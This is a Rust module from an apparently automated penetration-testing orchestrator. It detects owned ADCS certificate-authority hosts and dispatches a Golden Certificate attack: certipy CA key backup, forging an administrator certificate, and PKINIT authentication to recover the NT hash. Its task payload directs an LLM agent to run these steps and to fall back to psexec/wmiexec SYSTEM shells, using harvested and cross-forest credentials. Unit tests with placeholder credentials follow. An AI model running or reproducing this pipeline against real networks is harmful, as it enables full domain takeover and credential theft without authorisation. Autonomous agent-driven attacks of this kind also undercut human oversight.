//! auto_golden_cert -- forge a Golden Certificate after owning an ADCS CA host.
//!
//! When a CA host is fully owned (local SYSTEM via lateral movement) and the
//! CA's domain is not yet dominated, drive the offline Golden Certificate
//! pipeline:
//!
//!   1. **Backup**: `certipy ca -backup` extracts the CA private key + cert
//!      to a PFX (requires SYSTEM/local admin or CA admin rights — owning the
//!      CA host satisfies this).
//!   2. **Forge**: `certipy forge -ca-pfx <pfx> -upn administrator@<domain>`
//!      produces a client-auth certificate signed by the CA, for any UPN.
//!      No DC interaction is needed — purely offline.
//!   3. **Auth**: `certipy auth -pfx forged.pfx -dc-ip <dc>` performs PKINIT
//!      to obtain the target user's NT hash.
//!
//! This is the universal terminal for cross-forest compromise: every ADCS-
//! adjacent attack path (ESC1/ESC4/ESC8, MSSQL→xp_cmdshell→host, RBCD →
//! S4U → SYSTEM, shadow creds → admin → host) converges here once the CA
//! host is owned, regardless of which forest the CA lives in.
//!
//! Cross-forest note: the CA's *own* domain credential is what we need for
//! the `certipy ca -backup` RPC call. We pull it via `find_source_credential`
//! / `find_trust_credential` so a cred from the originating forest works
//! when there is no same-domain cred yet.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Watches for owned CA hosts and dispatches Golden Certificate pipelines.
/// Interval: 30s.
pub async fn auto_golden_cert(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("golden_cert") {
            continue;
        }

        let work: Vec<GoldenCertWork> = {
            let state = dispatcher.state.read().await;
            collect_golden_cert_work(&state)
        };

        for item in work {
            let mut payload = json!({
                "technique": "golden_cert",
                "ca_host": item.ca_host,
                "ca_hostname": item.ca_hostname,
                "domain": item.domain,
                "target_user": "administrator",
                "target_upn": format!("administrator@{}", item.domain),
                "credential": {
                    "username": item.credential.username,
                    "password": item.credential.password,
                    "domain": item.credential.domain,
                },
                "username": item.credential.username,
                "password": item.credential.password,
                "objectives": [
                    "Step 1 (backup): run `certipy_ca` with backup=true, ca=<discovered CA name>, username/password from credential, dc_ip=<DC for this domain>. Requires SYSTEM or CA admin on the CA host — since this host is owned, you can also run a SYSTEM shell (psexec/wmiexec) and execute certipy locally.",
                    "Step 2 (forge): run `certipy_forge` with ca_pfx=<the .pfx produced in step 1>, upn=`administrator@<domain>`. Output is a forged client-auth certificate signed by the CA private key — no DC interaction needed.",
                    "Step 3 (auth): run `certipy_auth` with pfx_path=<forged pfx>, domain=<domain>, dc_ip=<DC IP> to PKINIT-authenticate as administrator and recover the NT hash.",
                    "If you don't yet know the CA name, run `certipy_find` first against this host to discover it (the CA's `Name` / `DNS Name`).",
                    "If `certipy_ca -backup` fails with an RPC/perm error from a network cred, fall back to a local SYSTEM shell (psexec/wmiexec to ca_host) and run certipy from there — the host is owned.",
                ],
            });

            if let Some(ref dc) = item.dc_ip {
                payload["dc_ip"] = json!(dc);
                payload["target_ip"] = json!(dc);
            }
            if let Some(ref ca_name) = item.ca_name {
                payload["ca_name"] = json!(ca_name);
            }
            if let Some(ref sid) = item.domain_sid {
                payload["domain_sid"] = json!(sid);
                payload["admin_sid"] = json!(format!("{sid}-500"));
            }

            let priority = dispatcher.effective_priority("golden_cert");
            match dispatcher
                .throttled_submit("exploit", "credential_access", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        ca_host = %item.ca_host,
                        domain = %item.domain,
                        "Golden Certificate pipeline dispatched"
                    );
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_GOLDEN_CERT, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_GOLDEN_CERT, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(ca_host = %item.ca_host, "Golden Cert deferred by throttler");
                }
                Err(e) => {
                    warn!(err = %e, ca_host = %item.ca_host, "Failed to dispatch Golden Cert");
                }
            }
        }
    }
}

/// Pure logic so it can be unit-tested without a `Dispatcher` or runtime.
fn collect_golden_cert_work(state: &StateInner) -> Vec<GoldenCertWork> {
    state
        .hosts
        .iter()
        .filter(|h| h.owned)
        .filter_map(|h| {
            let host_lower = h.ip.to_lowercase();
            let hostname_lower = h.hostname.to_lowercase();

            let is_ca = state.shares.iter().any(|s| {
                s.name.to_lowercase() == "certenroll"
                    && (s.host == h.ip || s.host.to_lowercase() == hostname_lower)
            });
            if !is_ca {
                return None;
            }

            let domain = extract_domain_from_fqdn(&h.hostname).and_then(|d| {
                if state.domains.iter().any(|known| known.to_lowercase() == d) {
                    Some(d)
                } else {
                    state
                        .domains
                        .iter()
                        .find(|known| d.ends_with(&format!(".{}", known.to_lowercase())))
                        .or_else(|| {
                            state
                                .domains
                                .iter()
                                .find(|known| known.to_lowercase().ends_with(&format!(".{d}")))
                        })
                        .cloned()
                        .or(Some(d))
                }
            })?;

            // Don't forge a Golden Cert against a domain we already own.
            if state.dominated_domains.contains(&domain) {
                return None;
            }

            let dedup_key = format!("{}:{}", host_lower, domain.to_lowercase());
            if state.is_processed(DEDUP_GOLDEN_CERT, &dedup_key) {
                return None;
            }

            // The certipy_ca call needs a credential that authenticates to the
            // CA host's domain. Try same-domain first, then trusted-domain
            // (cross-forest) as fallback.
            let same_domain = state
                .credentials
                .iter()
                .find(|c| {
                    !c.password.is_empty()
                        && c.domain.to_lowercase() == domain.to_lowercase()
                        && !c.username.starts_with('$')
                        && !state.is_delegation_account(&c.username)
                        && !state.is_principal_quarantined(&c.username, &c.domain)
                })
                .cloned();

            let credential = same_domain.or_else(|| state.find_trust_credential(&domain))?;

            let dc_ip = state
                .domain_controllers
                .get(&domain.to_lowercase())
                .cloned();

            let domain_sid = state.domain_sids.get(&domain.to_lowercase()).cloned();

            let ca_name = lookup_ca_name(state, &h.ip, &h.hostname);

            Some(GoldenCertWork {
                ca_host: h.ip.clone(),
                ca_hostname: h.hostname.clone(),
                dedup_key,
                domain,
                dc_ip,
                domain_sid,
                ca_name,
                credential,
            })
        })
        .collect()
}

/// Extract the domain portion of an FQDN ("ca01.contoso.local" -> "contoso.local").
fn extract_domain_from_fqdn(fqdn: &str) -> Option<String> {
    fqdn.to_lowercase()
        .split_once('.')
        .map(|(_, d)| d.to_string())
}

/// Look up a CA name from previously-discovered ADCS vulns on this host.
/// Falls back to None if no `certipy_find` result has populated `ca_name` yet —
/// the LLM agent is instructed to run certipy_find first when this is missing.
fn lookup_ca_name(state: &StateInner, host_ip: &str, hostname: &str) -> Option<String> {
    let host_l = host_ip.to_lowercase();
    let hn_l = hostname.to_lowercase();
    state
        .discovered_vulnerabilities
        .values()
        .filter(|v| {
            let t = v.target.to_lowercase();
            t == host_l || t == hn_l
        })
        .find_map(|v| {
            for key in &["ca_name", "CA", "ca"] {
                if let Some(s) = v.details.get(*key).and_then(|x| x.as_str()) {
                    if !s.is_empty() {
                        return Some(s.to_string());
                    }
                }
            }
            None
        })
}

struct GoldenCertWork {
    ca_host: String,
    ca_hostname: String,
    dedup_key: String,
    domain: String,
    dc_ip: Option<String>,
    domain_sid: Option<String>,
    ca_name: Option<String>,
    credential: ares_core::models::Credential,
}

#[cfg(test)]
mod tests {
    use super::*;
    use ares_core::models::{Credential, Host, Share};

    fn make_credential(username: &str, password: &str, domain: &str) -> Credential {
        Credential {
            id: format!("c-{username}"),
            username: username.into(),
            password: password.into(), // pragma: allowlist secret
            domain: domain.into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        }
    }

    fn make_host(ip: &str, hostname: &str, owned: bool) -> Host {
        Host {
            ip: ip.into(),
            hostname: hostname.into(),
            os: String::new(),
            roles: Vec::new(),
            services: Vec::new(),
            is_dc: false,
            owned,
        }
    }

    fn make_share(host: &str, name: &str) -> Share {
        Share {
            host: host.into(),
            name: name.into(),
            permissions: String::new(),
            comment: String::new(),
            authenticated_as: None,
        }
    }

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_GOLDEN_CERT, "golden_cert");
    }

    #[test]
    fn extract_domain_typical() {
        assert_eq!(
            extract_domain_from_fqdn("ca01.contoso.local"),
            Some("contoso.local".to_string())
        );
    }

    #[test]
    fn extract_domain_case_insensitive() {
        assert_eq!(
            extract_domain_from_fqdn("CA01.CONTOSO.LOCAL"),
            Some("contoso.local".to_string())
        );
    }

    #[test]
    fn extract_domain_bare_hostname() {
        assert_eq!(extract_domain_from_fqdn("ca01"), None);
    }

    #[test]
    fn collect_empty_state_returns_no_work() {
        let state = StateInner::new("test-op".into());
        let work = collect_golden_cert_work(&state);
        assert!(work.is_empty());
    }

    #[test]
    fn collect_unowned_ca_host_skipped() {
        let mut state = StateInner::new("test-op".into());
        state.shares.push(make_share("192.168.58.50", "CertEnroll"));
        state
            .hosts
            .push(make_host("192.168.58.50", "ca01.contoso.local", false));
        state.domains.push("contoso.local".into());
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        let work = collect_golden_cert_work(&state);
        assert!(work.is_empty(), "unowned CA host should not yield work");
    }

    #[test]
    fn collect_owned_non_ca_host_skipped() {
        let mut state = StateInner::new("test-op".into());
        // Owned host but no CertEnroll share
        state
            .hosts
            .push(make_host("192.168.58.20", "fs01.contoso.local", true));
        state.domains.push("contoso.local".into());
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        let work = collect_golden_cert_work(&state);
        assert!(work.is_empty(), "non-CA owned host should not yield work");
    }

    #[test]
    fn collect_owned_ca_with_same_domain_cred_yields_work() {
        let mut state = StateInner::new("test-op".into());
        state.shares.push(make_share("192.168.58.50", "CertEnroll"));
        state
            .hosts
            .push(make_host("192.168.58.50", "ca01.contoso.local", true));
        state.domains.push("contoso.local".into());
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        let work = collect_golden_cert_work(&state);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].ca_host, "192.168.58.50");
        assert_eq!(work[0].ca_hostname, "ca01.contoso.local");
        assert_eq!(work[0].domain, "contoso.local");
        assert_eq!(work[0].credential.username, "admin");
        assert_eq!(work[0].dedup_key, "192.168.58.50:contoso.local");
    }

    #[test]
    fn collect_dominated_domain_skipped() {
        let mut state = StateInner::new("test-op".into());
        state.shares.push(make_share("192.168.58.50", "CertEnroll"));
        state
            .hosts
            .push(make_host("192.168.58.50", "ca01.contoso.local", true));
        state.domains.push("contoso.local".into());
        state.dominated_domains.insert("contoso.local".into());
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        let work = collect_golden_cert_work(&state);
        assert!(
            work.is_empty(),
            "should not forge against an already-dominated domain"
        );
    }

    #[test]
    fn collect_dedup_skips_processed() {
        let mut state = StateInner::new("test-op".into());
        state.shares.push(make_share("192.168.58.50", "CertEnroll"));
        state
            .hosts
            .push(make_host("192.168.58.50", "ca01.contoso.local", true));
        state.domains.push("contoso.local".into());
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        state.mark_processed(DEDUP_GOLDEN_CERT, "192.168.58.50:contoso.local".into());
        let work = collect_golden_cert_work(&state);
        assert!(work.is_empty());
    }

    #[test]
    fn collect_no_credential_skipped() {
        let mut state = StateInner::new("test-op".into());
        state.shares.push(make_share("192.168.58.50", "CertEnroll"));
        state
            .hosts
            .push(make_host("192.168.58.50", "ca01.contoso.local", true));
        state.domains.push("contoso.local".into());
        // No credentials at all
        let work = collect_golden_cert_work(&state);
        assert!(work.is_empty());
    }

    #[test]
    fn collect_resolves_dc_ip_when_available() {
        let mut state = StateInner::new("test-op".into());
        state.shares.push(make_share("192.168.58.50", "CertEnroll"));
        state
            .hosts
            .push(make_host("192.168.58.50", "ca01.contoso.local", true));
        state.domains.push("contoso.local".into());
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        state
            .domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let work = collect_golden_cert_work(&state);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].dc_ip.as_deref(), Some("192.168.58.10"));
    }

    #[test]
    fn collect_certenroll_case_insensitive() {
        let mut state = StateInner::new("test-op".into());
        state.shares.push(make_share("192.168.58.50", "certenroll"));
        state
            .hosts
            .push(make_host("192.168.58.50", "ca01.contoso.local", true));
        state.domains.push("contoso.local".into());
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        let work = collect_golden_cert_work(&state);
        assert_eq!(work.len(), 1);
    }

    #[test]
    fn collect_picks_domain_sid_when_known() {
        let mut state = StateInner::new("test-op".into());
        state.shares.push(make_share("192.168.58.50", "CertEnroll"));
        state
            .hosts
            .push(make_host("192.168.58.50", "ca01.contoso.local", true));
        state.domains.push("contoso.local".into());
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        state
            .domain_sids
            .insert("contoso.local".into(), "S-1-5-21-1111-2222-3333".into());
        let work = collect_golden_cert_work(&state);
        assert_eq!(work.len(), 1);
        assert_eq!(
            work[0].domain_sid.as_deref(),
            Some("S-1-5-21-1111-2222-3333")
        );
    }

    #[test]
    fn collect_dedup_key_lowercased() {
        let mut state = StateInner::new("test-op".into());
        state.shares.push(make_share("192.168.58.50", "CertEnroll"));
        state
            .hosts
            .push(make_host("192.168.58.50", "CA01.CONTOSO.LOCAL", true));
        state.domains.push("contoso.local".into());
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        let work = collect_golden_cert_work(&state);
        assert_eq!(work.len(), 1);
        // Dedup key uses lowercase IP (already lowercase here) and lowercase domain
        assert_eq!(work[0].dedup_key, "192.168.58.50:contoso.local");
    }

    #[test]
    fn collect_multiple_owned_cas_yields_multiple_work() {
        let mut state = StateInner::new("test-op".into());
        state.shares.push(make_share("192.168.58.50", "CertEnroll"));
        state.shares.push(make_share("192.168.58.51", "CertEnroll"));
        state
            .hosts
            .push(make_host("192.168.58.50", "ca01.contoso.local", true));
        state
            .hosts
            .push(make_host("192.168.58.51", "ca02.fabrikam.local", true));
        state.domains.push("contoso.local".into());
        state.domains.push("fabrikam.local".into());
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        state
            .credentials
            .push(make_credential("fabadmin", "Fab!Pass", "fabrikam.local")); // pragma: allowlist secret
        let work = collect_golden_cert_work(&state);
        assert_eq!(work.len(), 2);
    }
}
